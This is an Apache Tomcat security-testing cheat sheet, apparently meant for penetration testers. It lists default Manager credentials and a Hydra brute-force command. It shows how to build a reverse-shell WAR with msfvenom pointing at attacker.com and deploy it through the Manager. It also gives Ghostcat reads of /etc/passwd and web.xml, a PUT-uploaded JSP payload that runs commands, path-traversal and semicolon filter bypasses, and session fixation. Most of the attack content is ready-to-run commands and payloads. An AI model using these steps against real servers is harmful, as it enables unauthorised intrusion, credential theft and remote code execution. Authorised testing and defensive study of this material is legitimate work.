# Apache Tomcat Security Testing

## Overview
Security testing for Apache Tomcat application server including Manager app abuse, CVE exploitation, and configuration issues.

## Reconnaissance
```
# Tomcat detection
curl -I https://target.com
# Server: Apache-Coyote/1.1 or Apache Tomcat/X.Y.Z

# Default error page reveals version
curl https://target.com/nonexistent → 404 with Tomcat version

# Default ports
:8080 (HTTP), :8443 (HTTPS), :8009 (AJP), :8005 (shutdown)

# Manager app locations
/manager/html → GUI manager
/manager/text → Text-based manager
/host-manager/html → Virtual host manager
```

## Default Credentials
```
# manager-gui credentials
admin:admin, admin:password, tomcat:tomcat, tomcat:s3cret
manager:manager, admin:s3cret, role1:role1

# tomcat-users.xml (if accessible)
curl https://target.com/manager/html
# Try default creds

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com http-get /manager/html
```

## Remote Code Execution via Manager

### WAR File Upload
```
# Generate malicious WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war > shell.war

# Upload via Manager GUI
# Or via curl:
curl -u admin:admin -T shell.war http://target.com/manager/text/deploy?path=/shell

# Access the shell
curl http://target.com/shell/

# Alternatively: JSP webshell in WAR
# Create WEB-INF/web.xml + shell.jsp → zip as .war
```

### CVE-2020-1938 (Ghostcat) - AJP SSRF/LFI
```
# AJP port (8009) - read local files or SSRF
# Using Ghostcat exploit:
python3 ghostcat.py -H target.com -p 8009 -f /WEB-INF/web.xml

# Can read any file in webapp:
python3 ghostcat.py -H target.com -f /WEB-INF/web.xml
python3 ghostcat.py -H target.com -f /etc/passwd

# If AJP accessible and file upload possible → RCE
```

### CVE-2017-12617 - PUT Method JSP Upload
```
# Tomcat 7.0.0 - 7.0.81, 8.5.0 - 8.5.22
# PUT method enabled without proper restriction
PUT /upload.jsp/ HTTP/1.1
<%out.println("test");Runtime rt = Runtime.getRuntime();String[] commands = {"id"};Process proc = rt.exec(commands);%>

# Then access:
GET /upload.jsp
```

## Path Traversal
```
# CVE-2020-13935: WebSocket path traversal
# Older CVEs for directory traversal:
GET /%2e%2e/%2e%2e/WEB-INF/web.xml
GET /..;/manager/html → bypass filter on /manager access

# Semicolon bypass (Tomcat path parameter confusion)
GET /admin;.css/secret
GET /admin;jsessionid=AAAAAA/secret
```

## Session Fixation via JSessionID
```
# Tomcat uses JSESSIONID
# Test if session ID in URL (/;jsessionid=) accepted
# Session fixation attack possible

# Set session in URL:
https://target.com/app/;jsessionid=ATTACKER_SESSION
```

## Information Disclosure
```
# Manager status page (if not authenticated)
GET /manager/status
GET /manager/status/all

# Server status
GET /server-status (if Apache in front)

# Error pages with stack traces
# Verbose error messages

# Exposed configuration
WEB-INF/web.xml → via path traversal or misconfig
WEB-INF/applicationContext.xml
META-INF/context.xml (database credentials)
```

## Testing Methodology
1. Detect Tomcat and identify version
2. Test default paths: /manager/html, /host-manager/html
3. Try default credentials
4. Check for AJP port (8009) — Ghostcat if open
5. Test PUT method for WAR/JSP upload
6. Check path traversal to WEB-INF files
7. Test semicolon bypass for path restrictions
8. Check for known CVEs based on version
9. Test error handling for information disclosure

## Tools
- `nuclei -t tomcat/` templates
- `ghostcat` exploit for CVE-2020-1938
- `msfvenom` for WAR generation
- Metasploit tomcat_mgr_deploy
- `nikto` for basic scanning
